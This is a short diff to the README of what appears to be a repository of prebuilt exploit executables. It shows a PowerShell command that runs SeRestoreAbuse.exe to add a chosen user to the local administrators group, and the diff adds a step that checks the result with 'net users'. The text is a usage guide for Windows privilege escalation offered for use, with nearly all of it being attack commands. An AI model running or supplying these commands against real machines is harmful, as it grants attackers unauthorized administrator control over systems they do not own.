@@ -9,3 +9,7 @@ This repo is just to have the prebuilt compiled exes to avoid manual compilation
 ```powershell
 .\SeRestoreAbuse.exe "cmd /c net localgroup administrators <usernametobeaddedtoadministratorgrouphere> /add"
 ```
+### Validate if it worked or not
+```powershell
+net users <username>
+```
